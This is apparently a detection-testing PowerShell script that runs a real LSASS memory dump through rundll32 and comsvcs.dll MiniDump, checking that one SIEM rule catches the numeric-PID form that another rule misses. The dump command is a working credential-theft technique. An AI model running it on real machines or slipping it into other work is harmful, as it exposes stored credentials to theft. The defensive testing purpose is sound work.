# Scenario 10 — LSASS Memory Dump via comsvcs.dll (rundll32 LOLBin)
# Triggers RULE-010: process_creation, process_name=rundll32.exe, command_line
# matches comsvcs.dll...MiniDump. Demonstrates that RULE-007 (which only matches
# the literal string "lsass") does NOT fire on this command line — the target is
# a numeric PID, not a name — while RULE-010 closes that gap.
# Run on: Windows VM with Sysmon + windows_forwarder.py running, as Administrator

$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if (-not $lsass) {
    Write-Error "Could not resolve lsass.exe PID."
    exit 1
}

$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$dump = Join-Path $here "out.dmp"

Write-Host "[10] Running rundll32.exe comsvcs.dll MiniDump against PID $($lsass.Id)..."
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id $dump full
Write-Host "[10] Removing dump file..."
Remove-Item $dump -Force -ErrorAction SilentlyContinue
Write-Host "[10] Done."
